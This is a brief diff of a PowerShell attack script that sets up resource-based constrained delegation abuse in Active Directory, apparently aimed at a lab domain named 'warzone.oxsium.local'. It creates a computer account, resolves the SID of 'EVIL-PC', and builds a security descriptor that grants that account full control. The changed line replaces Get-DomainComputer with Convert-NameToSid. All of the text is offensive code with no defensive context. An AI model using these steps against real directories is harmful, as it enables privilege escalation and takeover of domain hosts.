@@ -143,7 +143,7 @@ New-ADComputer -Name $ComputerName -SAMAccountName "$ComputerName$" `
     -AccountPassword $Password -Enabled $true `
     -Path "CN=Computers,DC=warzone,DC=oxsium,DC=local"
 
-$evilSID = Get-DomainComputer -Identity "EVIL-PC" -Properties objectsid -Domain "warzone.oxsium.local" | Select -Expand objectsid
+$evilSID = Convert-NameToSid EVIL-PC$
 
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$evilSID)"
 $SDbytes = New-Object byte[] ($SD.BinaryLength)
